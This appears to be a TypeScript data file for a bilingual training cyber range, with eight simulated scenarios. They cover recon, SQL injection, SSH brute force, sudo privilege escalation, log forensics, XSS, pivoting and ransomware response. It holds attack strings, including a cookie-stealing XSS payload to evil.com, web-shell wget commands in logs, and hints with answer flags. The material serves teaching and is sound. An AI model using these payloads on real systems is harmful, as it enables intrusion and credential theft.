/**
 * 🎯 Cyber Range — Scenario Data
 * Pre-built attack scenarios with unique VFS, networks, and vulnerabilities.
 * Each scenario is fully self-contained and runs in the browser.
 */
import { LabState } from './tool-engines';

export interface ScenarioMeta {
    id: string;
    title_ar: string;
    title_en: string;
    description_ar: string;
    description_en: string;
    story_ar: string;
    difficulty: 'beginner' | 'intermediate' | 'advanced';
    category: string;
    xp: number;
    duration: string;
    tools: string[];
    objectives: {
        id: string;
        step_order: number;
        title_ar: string;
        title_en: string;
        task_description: string;
        validation_regex: string;
        hint: string;
    }[];
    initialState: LabState;
}

// ═══════════════════════════════════════════════════════════
// SCENARIO 1: Web Server Recon — استطلاع خادم الويب
// ═══════════════════════════════════════════════════════════
const scenario1: ScenarioMeta = {
    id: 'web-recon-101',
    title_ar: 'استطلاع خادم الويب',
    title_en: 'Web Server Reconnaissance',
    description_ar: 'تعلم أساسيات استطلاع الشبكة واكتشاف الخدمات المفتوحة على خادم ويب مستهدف.',
    description_en: 'Learn network reconnaissance basics and discover open services on a target web server.',
    story_ar: 'تم تعيينك كمختبر اختراق لفحص خادم شركة "بيتا تك". مهمتك هي اكتشاف الخدمات المتاحة والبحث عن نقاط ضعف محتملة. ابدأ بفحص الشبكة واكتشف ما يمكنك إيجاده.',
    difficulty: 'beginner',
    category: 'network',
    xp: 100,
    duration: '20m',
    tools: ['Nmap', 'Curl', 'Dirb'],
    objectives: [
        {
            id: 'wr-1', step_order: 1,
            title_ar: 'اكتشف الخدمات المفتوحة',
            title_en: 'Discover Open Services',
            task_description: 'استخدم nmap لفحص الخادم 10.0.1.50 واكتشف المنافذ المفتوحة.',
            validation_regex: 'nmap\\s+10\\.0\\.1\\.50',
            hint: 'استخدم الأمر: nmap <ip>'
        },
        {
            id: 'wr-2', step_order: 2,
            title_ar: 'اعثر على العلم المخفي',
            title_en: 'Find the Hidden Flag',
            task_description: 'تصفح ملفات الخادم واعثر على العلم. ابحث في ملفات الإعدادات.',
            validation_regex: 'cat.*(robots\\.txt|config|secret)',
            hint: 'جرب: curl 10.0.1.50/robots.txt أو تصفح الملفات بـ ls وcat'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': {
                    'passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:admin:/home/admin:/bin/bash',
                    'hostname': 'beta-tech-web-01',
                    'shadow': 'Permission denied: only root can read this file'
                },
                'home': {
                    'admin': {
                        'notes.txt': 'TODO:\n- Update Apache to latest version\n- Change default SSH password\n- Remove test files from /var/www/html',
                        '.bash_history': 'ssh admin@10.0.1.51\npassword123\nnmap 10.0.1.50\ncat /var/log/auth.log'
                    }
                },
                'var': {
                    'www': {
                        'html': {
                            'index.html': '<html><head><title>Beta Tech Corp</title></head><body><h1>Welcome to Beta Tech</h1></body></html>',
                            'robots.txt': 'User-agent: *\nDisallow: /admin/\nDisallow: /backup/\n# Flag: CyberShield{r0b0ts_txt_1s_n0t_s3cur1ty}',
                            'admin': {
                                'login.php': '<?php\n// TODO: Add proper authentication\n// Default creds: admin/admin123\nif($_POST["user"]=="admin" && $_POST["pass"]=="admin123") { ... }',
                                'config.php': '<?php\n$db_host = "localhost";\n$db_user = "root";\n$db_pass = "Beta2026!Secret";\n$db_name = "beta_tech_db";'
                            },
                            'backup': {
                                'db_dump.sql': '-- MySQL dump\n-- Database: beta_tech_db\nCREATE TABLE users (id INT, username VARCHAR(50), password VARCHAR(255));\nINSERT INTO users VALUES (1, "admin", "5f4dcc3b5aa765d61d8327deb882cf99");'
                            }
                        }
                    },
                    'log': {
                        'apache2': {
                            'access.log': '10.0.1.100 - - [19/Apr/2026:08:00:01] "GET / HTTP/1.1" 200 612\n10.0.1.100 - - [19/Apr/2026:08:00:15] "GET /admin/ HTTP/1.1" 403 287\n203.0.113.50 - - [19/Apr/2026:08:05:22] "GET /admin/login.php HTTP/1.1" 200 1024',
                            'error.log': '[error] [client 203.0.113.50] File does not exist: /var/www/html/wp-admin\n[error] [client 203.0.113.50] File does not exist: /var/www/html/phpmyadmin'
                        },
                        'auth.log': '[2026-04-19 03:00:01] Failed password for admin from 203.0.113.50 port 22\n[2026-04-19 03:00:02] Failed password for admin from 203.0.113.50 port 22\n[2026-04-19 03:00:03] Accepted password for admin from 203.0.113.50 port 22'
                    }
                }
            }
        },
        network: [
            {
                ip: '10.0.1.50',
                hostname: 'beta-tech-web-01',
                ports: [
                    { port: 22, service: 'ssh', version: 'OpenSSH 7.6p1' },
                    { port: 80, service: 'http', version: 'Apache/2.4.29 (Ubuntu)' },
                    { port: 3306, service: 'mysql', version: 'MySQL 5.7.42' }
                ],
                vulnerabilities: [],
                webPaths: {
                    '/': '<h1>Welcome to Beta Tech</h1>',
                    '/robots.txt': 'User-agent: *\nDisallow: /admin/\nDisallow: /backup/\n# Flag: CyberShield{r0b0ts_txt_1s_n0t_s3cur1ty}',
                    '/admin/': '403 Forbidden',
                    '/admin/login.php': '<form method="POST"><input name="user"><input name="pass" type="password"><button>Login</button></form>',
                    '/backup/': 'Index of /backup/\n  db_dump.sql  2.3MB  2026-04-15'
                }
            }
        ],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'user',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 2: SQL Injection — حقن قواعد البيانات
// ═══════════════════════════════════════════════════════════
const scenario2: ScenarioMeta = {
    id: 'sqli-basics',
    title_ar: 'هجوم حقن SQL',
    title_en: 'SQL Injection Attack',
    description_ar: 'تعلم كيفية اكتشاف واستغلال ثغرات حقن SQL في تطبيقات الويب.',
    description_en: 'Learn how to discover and exploit SQL injection vulnerabilities in web applications.',
    story_ar: 'تم الإبلاغ عن ثغرة في موقع متجر "نوفا شوب" الإلكتروني. مهمتك كمختبر اختراق هي اكتشاف الثغرة واستخراج بيانات حساسة لإثبات الخطورة.',
    difficulty: 'beginner',
    category: 'web',
    xp: 150,
    duration: '25m',
    tools: ['SQLMap', 'Curl'],
    objectives: [
        {
            id: 'sql-1', step_order: 1,
            title_ar: 'اكتشف الثغرة',
            title_en: 'Discover the Vulnerability',
            task_description: 'استخدم curl لاختبار صفحة البحث مع حقن SQL بسيط على الخادم 10.0.2.20.',
            validation_regex: "curl.*10\\.0\\.2\\.20.*(search|product|id=).*('|OR|UNION)",
            hint: "جرب: curl \"10.0.2.20/search?q=' OR 1=1--\""
        },
        {
            id: 'sql-2', step_order: 2,
            title_ar: 'استخرج البيانات',
            title_en: 'Extract Data',
            task_description: 'استخدم sqlmap لاستخراج قاعدة البيانات من نقطة الضعف المكتشفة.',
            validation_regex: 'sqlmap.*10\\.0\\.2\\.20',
            hint: 'استخدم: sqlmap -u "10.0.2.20/search?q=test" --dbs'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': {
                    'passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www:/var/www',
                    'hostname': 'pentester-workstation'
                },
                'home': {
                    'pentester': {
                        'targets.txt': 'Nova Shop E-Commerce\nTarget IP: 10.0.2.20\nScope: Full web application pentest\nContact: security@novashop.local',
                        'wordlists': {
                            'common-sqli.txt': "' OR 1=1--\n\" OR 1=1--\n1' UNION SELECT NULL--\n1' AND 1=1--\nadmin'--"
                        }
                    }
                },
                'var': {
                    'log': {
                        'auth.log': 'No suspicious activity detected.'
                    }
                }
            }
        },
        network: [
            {
                ip: '10.0.2.20',
                hostname: 'nova-shop-web',
                ports: [
                    { port: 80, service: 'http', version: 'nginx/1.18.0' },
                    { port: 443, service: 'https', version: 'nginx/1.18.0' },
                    { port: 3306, service: 'mysql', version: 'MySQL 8.0.28', banner: 'MySQL Community Server' }
                ],
                vulnerabilities: [
                    {
                        id: 'sqli_search',
                        name: 'SQL Injection in search parameter',
                        tool_required: 'sqlmap',
                        payload_regex: "' OR 1=1",
                        effect: () => 'Flag: CyberShield{sql_1nj3ct10n_m4st3r}'
                    }
                ],
                webPaths: {
                    '/': '<h1>Nova Shop - Online Store</h1><form action="/search"><input name="q" placeholder="Search products..."></form>',
                    '/search?q=test': 'Results for "test": \n  1. Test Product - $9.99',
                    "/search?q=' OR 1=1--": '[SQL Error] You have an error in your SQL syntax near "ORDER BY id"\n\n⚠️ DATABASE EXPOSED:\nusers table:\n  admin | admin@nova.local | 5e884898da28...\n  john  | john@nova.local  | 482c811da5d5...\n\nFlag: CyberShield{sql_1nj3ct10n_m4st3r}',
                }
            }
        ],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'pentester',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 3: SSH Brute Force — هجوم التخمين
// ═══════════════════════════════════════════════════════════
const scenario3: ScenarioMeta = {
    id: 'ssh-bruteforce',
    title_ar: 'هجوم التخمين على SSH',
    title_en: 'SSH Brute Force Attack',
    description_ar: 'تعلم كيف يتم تنفيذ هجمات التخمين وكيفية الحماية منها.',
    description_en: 'Learn how brute force attacks work and how to defend against them.',
    story_ar: 'تم اكتشاف أن خادم شركة "غاما سيك" يستخدم كلمات مرور ضعيفة. مهمتك هي إثبات إمكانية اختراق الحسابات عبر هجوم تخمين وتقديم توصيات أمنية.',
    difficulty: 'intermediate',
    category: 'network',
    xp: 200,
    duration: '30m',
    tools: ['Nmap', 'Hydra', 'SSH'],
    objectives: [
        {
            id: 'bf-1', step_order: 1,
            title_ar: 'افحص الخادم',
            title_en: 'Scan the Server',
            task_description: 'افحص الخادم 10.0.3.15 واكتشف خدمة SSH المفتوحة.',
            validation_regex: 'nmap.*10\\.0\\.3\\.15',
            hint: 'استخدم: nmap 10.0.3.15'
        },
        {
            id: 'bf-2', step_order: 2,
            title_ar: 'نفّذ هجوم التخمين',
            title_en: 'Execute Brute Force',
            task_description: 'استخدم hydra لمحاولة تخمين كلمة مرور المستخدم admin على SSH.',
            validation_regex: 'hydra.*ssh.*10\\.0\\.3\\.15',
            hint: 'استخدم: hydra -l admin -P /home/pentester/wordlists/passwords.txt ssh://10.0.3.15'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': { 'hostname': 'attacker-machine' },
                'home': {
                    'pentester': {
                        'wordlists': {
                            'passwords.txt': '123456\npassword\nadmin\nroot\nletmein\nadmin123\npassword1\nqwerty\ngamma2026',
                            'users.txt': 'admin\nroot\nuser\noperator'
                        },
                        'scope.txt': 'Target: Gamma Sec Server\nIP: 10.0.3.15\nObjective: Test SSH password strength'
                    }
                }
            }
        },
        network: [
            {
                ip: '10.0.3.15',
                hostname: 'gamma-sec-srv',
                ports: [
                    { port: 22, service: 'ssh', version: 'OpenSSH 8.9p1', banner: 'SSH-2.0-OpenSSH_8.9p1 Ubuntu' },
                    { port: 80, service: 'http', version: 'Apache/2.4.52' }
                ],
                vulnerabilities: [],
                sshCredentials: { admin: 'gamma2026' },
                webPaths: {
                    '/': '<h1>Gamma Sec - Internal Portal</h1><p>Employee access only.</p>'
                }
            }
        ],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'pentester',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 4: Privilege Escalation — تصعيد الصلاحيات
// ═══════════════════════════════════════════════════════════
const scenario4: ScenarioMeta = {
    id: 'priv-escalation',
    title_ar: 'تصعيد الصلاحيات',
    title_en: 'Linux Privilege Escalation',
    description_ar: 'تعلم كيفية تصعيد الصلاحيات من مستخدم عادي إلى root على نظام Linux.',
    description_en: 'Learn how to escalate privileges from a regular user to root on Linux.',
    story_ar: 'حصلت على وصول محدود لخادم شركة "دلتا نت" كمستخدم عادي. مهمتك هي إيجاد طريقة للحصول على صلاحيات root لإثبات خطورة الإعدادات الخاطئة.',
    difficulty: 'intermediate',
    category: 'system',
    xp: 250,
    duration: '35m',
    tools: ['Find', 'Sudo', 'Cat'],
    objectives: [
        {
            id: 'pe-1', step_order: 1,
            title_ar: 'اكتشف ملفات SUID',
            title_en: 'Find SUID Files',
            task_description: 'ابحث عن ملفات ذات صلاحيات SUID التي يمكن استغلالها.',
            validation_regex: 'find.*(suid|perm|4000)',
            hint: 'استخدم: find / -perm -4000 -type f'
        },
        {
            id: 'pe-2', step_order: 2,
            title_ar: 'استغل sudo',
            title_en: 'Exploit Sudo Misconfiguration',
            task_description: 'تحقق من صلاحيات sudo الممنوحة لك واستغلها.',
            validation_regex: 'sudo.*(\\-l|vim|less|find|bash)',
            hint: 'جرب: sudo -l لرؤية الأوامر المسموحة ثم استغلها'
        },
        {
            id: 'pe-3', step_order: 3,
            title_ar: 'اقرأ العلم كـ root',
            title_en: 'Read Flag as Root',
            task_description: 'بعد الحصول على صلاحيات root، اقرأ الملف /root/flag.txt.',
            validation_regex: 'cat.*/root/flag',
            hint: 'بعد تصعيد الصلاحيات بـ sudo، استخدم: cat /root/flag.txt'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': {
                    'passwd': 'root:x:0:0:root:/root:/bin/bash\njohn:x:1001:1001::/home/john:/bin/bash',
                    'hostname': 'delta-net-srv',
                    'sudoers': 'john ALL=(ALL) NOPASSWD: /usr/bin/vim, /usr/bin/find, /usr/bin/less'
                },
                'home': {
                    'john': {
                        '.bash_history': 'sudo vim /etc/passwd\nls -la\nwhoami',
                        'notes.txt': 'The admin gave me sudo access to vim for editing config files.\nI wonder if that could be dangerous...'
                    }
                },
                'root': {
                    'flag.txt': '🏴 CyberShield{pr1v_3sc_v1a_sud0_m1sc0nf1g}\n\nCongratulations! You successfully escalated privileges.\nThis was possible because of misconfigured sudo rules.',
                    '.ssh': {
                        'id_rsa': '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...[REDACTED]...\n-----END RSA PRIVATE KEY-----'
                    }
                },
                'tmp': {
                    'backup.sh': '#!/bin/bash\n# Run as root via cron\ntar -czf /tmp/backup.tar.gz /var/www /etc/passwd'
                },
                'usr': {
                    'bin': {
                        'vim': '[SUID binary] -rwsrwxrwx root:root vim',
                        'find': '[SUID binary] -rwsrwxrwx root:root find'
                    }
                }
            }
        },
        network: [],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'john',
        env: { SUDO_ALLOWED: 'vim,find,less' }
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 5: Log Analysis — تحليل السجلات
// ═══════════════════════════════════════════════════════════
const scenario5: ScenarioMeta = {
    id: 'log-forensics',
    title_ar: 'التحليل الجنائي للسجلات',
    title_en: 'Log Analysis Forensics',
    description_ar: 'تعلم كيفية تحليل سجلات النظام لاكتشاف الهجمات والأنشطة المشبوهة.',
    description_en: 'Learn how to analyze system logs to discover attacks and suspicious activities.',
    story_ar: 'تم اختراق خادم شركة "إبسيلون" ليلة أمس. كمحقق جنائي رقمي، مهمتك تحليل السجلات وتحديد: من المهاجم، ماذا فعل، وكيف دخل.',
    difficulty: 'intermediate',
    category: 'forensics',
    xp: 200,
    duration: '30m',
    tools: ['Cat', 'Grep', 'Find', 'Tail'],
    objectives: [
        {
            id: 'lf-1', step_order: 1,
            title_ar: 'حدد عنوان المهاجم',
            title_en: 'Identify Attacker IP',
            task_description: 'حلل سجلات auth.log واكتشف عنوان IP الذي نفّذ هجوم تخمين كلمة المرور.',
            validation_regex: 'grep.*(Failed|brute|attack|45\\.33)',
            hint: 'استخدم: grep "Failed" /var/log/auth.log لإيجاد محاولات الدخول الفاشلة'
        },
        {
            id: 'lf-2', step_order: 2,
            title_ar: 'اكتشف ماذا فعل المهاجم',
            title_en: 'Discover What Attacker Did',
            task_description: 'ابحث في سجلات Apache عن أنشطة المهاجم بعد الاختراق.',
            validation_regex: 'grep.*(45\\.33|cmd=|exec|wget).*access',
            hint: 'ابحث عن IP المهاجم في access.log: grep "45.33.32.10" /var/log/apache2/access.log'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': { 'hostname': 'epsilon-forensics-ws' },
                'home': {
                    'analyst': {
                        'case-notes.txt': 'Incident Report #2026-0419\nClient: Epsilon Corp\nDate: 2026-04-18\nSummary: Suspected breach on web server.\nEvidence collected at /evidence/'
                    }
                },
                'evidence': {
                    'timeline.txt': '18:00 - Normal operations\n18:15 - Brute force attack begins (auth.log)\n18:45 - Successful login via SSH\n18:46 - Web shell uploaded\n18:50 - Data exfiltration begins\n19:00 - Attack detected by IDS'
                },
                'var': {
                    'log': {
                        'auth.log': '[2026-04-18 18:15:01] Failed password for admin from 45.33.32.10 port 49182 ssh2\n[2026-04-18 18:15:02] Failed password for admin from 45.33.32.10 port 49183 ssh2\n[2026-04-18 18:15:03] Failed password for admin from 45.33.32.10 port 49184 ssh2\n[2026-04-18 18:15:04] Failed password for admin from 45.33.32.10 port 49185 ssh2\n[2026-04-18 18:15:05] Failed password for root from 45.33.32.10 port 49186 ssh2\n[2026-04-18 18:15:33] Failed password for admin from 45.33.32.10 port 49200 ssh2\n[2026-04-18 18:44:59] Accepted password for admin from 45.33.32.10 port 49350 ssh2\n[2026-04-18 18:45:01] session opened for user admin\n[2026-04-18 18:45:02] sudo: admin : TTY=pts/0 ; PWD=/home/admin ; COMMAND=/bin/bash\n\nFlag (Attacker IP): CyberShield{f0r3ns1cs_45_33_32_10}',
                        'apache2': {
                            'access.log': '192.168.1.100 - - [18/Apr/2026:17:00:00] "GET / HTTP/1.1" 200 612\n192.168.1.100 - - [18/Apr/2026:17:30:00] "GET /about HTTP/1.1" 200 1024\n45.33.32.10 - - [18/Apr/2026:18:46:15] "POST /upload.php HTTP/1.1" 200 54\n45.33.32.10 - - [18/Apr/2026:18:46:20] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200 32\n45.33.32.10 - - [18/Apr/2026:18:47:00] "GET /uploads/shell.php?cmd=cat+/etc/passwd HTTP/1.1" 200 1520\n45.33.32.10 - - [18/Apr/2026:18:48:00] "GET /uploads/shell.php?cmd=wget+http://evil.com/backdoor HTTP/1.1" 200 0\n45.33.32.10 - - [18/Apr/2026:18:50:00] "GET /uploads/shell.php?cmd=tar+czf+/tmp/data.tar.gz+/var/www/data HTTP/1.1" 200 0'
                        }
                    }
                }
            }
        },
        network: [],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'analyst',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 6: XSS Attack — هجوم XSS
// ═══════════════════════════════════════════════════════════
const scenario6: ScenarioMeta = {
    id: 'xss-attack',
    title_ar: 'هجوم البرمجة عبر المواقع (XSS)',
    title_en: 'Cross-Site Scripting (XSS)',
    description_ar: 'تعلم كيف تعمل ثغرات XSS وكيفية استغلالها لسرقة ملفات تعريف الارتباط.',
    description_en: 'Learn how XSS vulnerabilities work and how they can steal cookies.',
    story_ar: 'اكتشف فريق أمن شركة "زيتا فورم" أن منتدى الدعم الخاص بهم يحتوي على ثغرة XSS. مهمتك إثبات خطورة الثغرة وتقديم توصيات الإصلاح.',
    difficulty: 'advanced',
    category: 'web',
    xp: 300,
    duration: '30m',
    tools: ['Curl', 'Nikto'],
    objectives: [
        {
            id: 'xss-1', step_order: 1,
            title_ar: 'افحص التطبيق',
            title_en: 'Scan the Application',
            task_description: 'استخدم nikto لفحص تطبيق الويب على 10.0.4.30 واكتشف الثغرات.',
            validation_regex: 'nikto.*10\\.0\\.4\\.30',
            hint: 'استخدم: nikto -h 10.0.4.30'
        },
        {
            id: 'xss-2', step_order: 2,
            title_ar: 'اختبر ثغرة XSS',
            title_en: 'Test XSS Vulnerability',
            task_description: 'جرب حقن كود JavaScript عبر حقل التعليقات.',
            validation_regex: 'curl.*(script|alert|onerror|XSS).*10\\.0\\.4\\.30',
            hint: 'جرب: curl "10.0.4.30/comment?text=<script>alert(1)</script>"'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': { 'hostname': 'xss-lab-station' },
                'home': {
                    'pentester': {
                        'xss-payloads.txt': '<script>alert("XSS")</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(document.cookie)>\n"><script>fetch("http://evil.com/steal?c="+document.cookie)</script>',
                        'report-template.md': '# XSS Vulnerability Report\n\n## Target: Zeta Forum\n## Type: [Stored/Reflected]\n## Impact: [Cookie theft / Session hijacking]\n## Payload: [Your payload here]'
                    }
                }
            }
        },
        network: [
            {
                ip: '10.0.4.30',
                hostname: 'zeta-forum-web',
                ports: [
                    { port: 80, service: 'http', version: 'Express/4.18.2 (Node.js)' },
                    { port: 27017, service: 'mongodb', version: 'MongoDB 6.0.4' }
                ],
                vulnerabilities: [
                    {
                        id: 'xss_comment',
                        name: 'Stored XSS in comment form',
                        tool_required: 'curl',
                        payload_regex: '<script|onerror|onload',
                        effect: () => 'XSS payload executed! Cookie: session=admin_token_abc123\nFlag: CyberShield{xss_c00k1e_th3ft_d3m0}'
                    }
                ],
                webPaths: {
                    '/': '<h1>Zeta Forum</h1><p>Community support forum</p>',
                    '/comment': 'Comment posted successfully.',
                }
            }
        ],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'pentester',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 7: Network Pivot — التنقل عبر الشبكة
// ═══════════════════════════════════════════════════════════
const scenario7: ScenarioMeta = {
    id: 'network-pivot',
    title_ar: 'التنقل عبر الشبكة الداخلية',
    title_en: 'Internal Network Pivoting',
    description_ar: 'تعلم كيفية التنقل من خادم مخترق إلى أهداف أخرى في الشبكة الداخلية.',
    description_en: 'Learn how to pivot from a compromised server to other internal targets.',
    story_ar: 'اخترقت خادم الويب الخارجي لشركة "ثيتا كورب". الآن تحتاج للتنقل إلى الشبكة الداخلية للوصول إلى خادم قواعد البيانات الذي يحتوي على بيانات حساسة.',
    difficulty: 'advanced',
    category: 'network',
    xp: 350,
    duration: '40m',
    tools: ['Nmap', 'SSH', 'Curl'],
    objectives: [
        {
            id: 'pv-1', step_order: 1,
            title_ar: 'افحص الشبكة الخارجية',
            title_en: 'Scan External Network',
            task_description: 'افحص الخادم الخارجي 10.0.5.10 واكتشف الخدمات.',
            validation_regex: 'nmap.*10\\.0\\.5\\.10',
            hint: 'ابدأ بـ: nmap 10.0.5.10'
        },
        {
            id: 'pv-2', step_order: 2,
            title_ar: 'ادخل الخادم عبر SSH',
            title_en: 'SSH into Server',
            task_description: 'استخدم بيانات الاعتماد المكتشفة للدخول إلى الخادم (admin/theta2026).',
            validation_regex: 'ssh.*admin.*10\\.0\\.5\\.10',
            hint: 'استخدم: ssh admin@10.0.5.10 (كلمة المرور: theta2026)'
        },
        {
            id: 'pv-3', step_order: 3,
            title_ar: 'اكتشف الشبكة الداخلية',
            title_en: 'Discover Internal Network',
            task_description: 'من داخل الخادم المخترق، افحص الشبكة الداخلية 10.0.5.0/24.',
            validation_regex: 'nmap.*10\\.0\\.5\\.(0|20|30)',
            hint: 'من داخل الجلسة: nmap 10.0.5.20'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': { 'hostname': 'external-attacker' },
                'home': {
                    'hacker': {
                        'intel.txt': 'Theta Corp Network Map (partial):\n- 10.0.5.10 - External Web Server\n- 10.0.5.20 - Internal DB Server (suspected)\n- 10.0.5.30 - Admin Panel (suspected)',
                        'credentials.txt': 'Credentials found from OSINT:\nadmin:theta2026 (web server SSH)'
                    }
                }
            }
        },
        network: [
            {
                ip: '10.0.5.10',
                hostname: 'theta-web-ext',
                ports: [
                    { port: 22, service: 'ssh', version: 'OpenSSH 9.0p1' },
                    { port: 80, service: 'http', version: 'Apache/2.4.54' },
                    { port: 443, service: 'https', version: 'Apache/2.4.54' }
                ],
                vulnerabilities: [],
                sshCredentials: { admin: 'theta2026' },
                webPaths: { '/': '<h1>Theta Corp</h1>' }
            },
            {
                ip: '10.0.5.20',
                hostname: 'theta-db-internal',
                ports: [
                    { port: 3306, service: 'mysql', version: 'MySQL 8.0.32' },
                    { port: 22, service: 'ssh', version: 'OpenSSH 9.0p1' }
                ],
                vulnerabilities: [],
                webPaths: {}
            },
            {
                ip: '10.0.5.30',
                hostname: 'theta-admin-panel',
                ports: [
                    { port: 8080, service: 'http', version: 'Tomcat/9.0.65' }
                ],
                vulnerabilities: [],
                webPaths: {
                    '/': 'Theta Corp Admin Panel\nFlag: CyberShield{n3tw0rk_p1v0t_succ3ss}'
                }
            }
        ],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'hacker',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// SCENARIO 8: Incident Response — الاستجابة للحوادث
// ═══════════════════════════════════════════════════════════
const scenario8: ScenarioMeta = {
    id: 'incident-response',
    title_ar: 'الاستجابة لحادثة برمجية الفدية',
    title_en: 'Ransomware Incident Response',
    description_ar: 'تعامل مع حادثة برمجية فدية: حدد نطاق الضرر، احتوِ التهديد، واستعد البيانات.',
    description_en: 'Handle a ransomware incident: assess damage, contain the threat, and recover data.',
    story_ar: 'استيقظت على مكالمة طوارئ: خادم شركة "أوميغا" تعرض لهجوم برمجية فدية. ملفات الشركة مشفرة والمهاجم يطلب فدية. مهمتك احتواء الحادثة واستعادة البيانات.',
    difficulty: 'advanced',
    category: 'incident-response',
    xp: 300,
    duration: '35m',
    tools: ['Cat', 'Grep', 'Find', 'Tail'],
    objectives: [
        {
            id: 'ir-1', step_order: 1,
            title_ar: 'حدد نطاق الإصابة',
            title_en: 'Assess Damage Scope',
            task_description: 'ابحث عن جميع الملفات المشفرة (امتداد .locked) لتحديد حجم الضرر.',
            validation_regex: 'find.*(locked|encrypted|ransom)',
            hint: 'استخدم: find / -name "*.locked" أو find / -name "*ransom*"'
        },
        {
            id: 'ir-2', step_order: 2,
            title_ar: 'اكتشف نقطة الدخول',
            title_en: 'Find Entry Point',
            task_description: 'حلل السجلات لاكتشاف كيف دخل المهاجم إلى النظام.',
            validation_regex: 'grep.*(malware|ransom|phish|77\\.88)',
            hint: 'ابحث في السجلات: grep "77.88" /var/log/auth.log أو cat /var/log/mail.log'
        }
    ],
    initialState: {
        cwd: ['/'],
        vfs: {
            '/': {
                'etc': { 'hostname': 'omega-ir-station' },
                'home': {
                    'responder': {
                        'incident-ticket.txt': 'INCIDENT #IR-2026-0419\nSeverity: CRITICAL\nType: Ransomware\nAffected System: omega-file-srv\nStatus: ACTIVE\nFirst Report: 2026-04-19 02:00 UTC'
                    }
                },
                'infected-server': {
                    'RANSOM_NOTE.txt': '⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️\n\nAll your documents have been encrypted with AES-256.\nTo recover them, send 5 BTC to:\n  bc1q...xyz\n\nYou have 72 hours.\n\n- DarkShadow Ransomware Group',
                    'data': {
                        'financial_report_2025.xlsx.locked': '[ENCRYPTED FILE - AES-256]',
                        'customer_database.sql.locked': '[ENCRYPTED FILE - AES-256]',
                        'employee_records.csv.locked': '[ENCRYPTED FILE - AES-256]'
                    },
                    'backups': {
                        'shadow-copy-2026-04-18.tar.gz': '[BACKUP - CLEAN - 2.3GB]\nThis backup was taken before the infection.\nFlag: CyberShield{b4ckup_s4v3s_th3_d4y}'
                    }
                },
                'var': {
                    'log': {
                        'auth.log': '[2026-04-18 23:00:01] Accepted password for admin from 77.88.55.100 port 44231\n[2026-04-18 23:00:05] sudo: admin : COMMAND=/bin/bash\n[2026-04-18 23:01:00] sudo: admin : COMMAND=/usr/bin/wget http://77.88.55.100/payload.sh\n[2026-04-18 23:01:05] sudo: admin : COMMAND=/bin/bash payload.sh',
                        'mail.log': '[2026-04-18 22:30:00] From: billing@fakeinvoice.com To: admin@omega.local Subject: "Invoice Overdue"\n[2026-04-18 22:30:01] Attachment: Invoice_April.pdf.exe (flagged by AV but user bypassed warning)',
                        'syslog': '[2026-04-19 01:00:00] ALERT: Unusual file modification rate detected (500 files/min)\n[2026-04-19 01:01:00] ALERT: File extension changes: .xlsx -> .xlsx.locked\n[2026-04-19 01:02:00] ALERT: Outbound connection to 77.88.55.100:4444 (C2 server)\n[2026-04-19 02:00:00] CRITICAL: Volume Shadow Copies deletion attempted'
                    }
                }
            }
        },
        network: [],
        discovered_ips: [],
        discovered_ports: {},
        exploited_ids: [],
        sshSessions: {},
        currentUser: 'responder',
        env: {}
    }
};

// ═══════════════════════════════════════════════════════════
// EXPORT ALL SCENARIOS
// ═══════════════════════════════════════════════════════════
export const ALL_SCENARIOS: ScenarioMeta[] = [
    scenario1, scenario2, scenario3, scenario4,
    scenario5, scenario6, scenario7, scenario8,
];

export function getScenarioById(id: string): ScenarioMeta | undefined {
    return ALL_SCENARIOS.find(s => s.id === id);
}
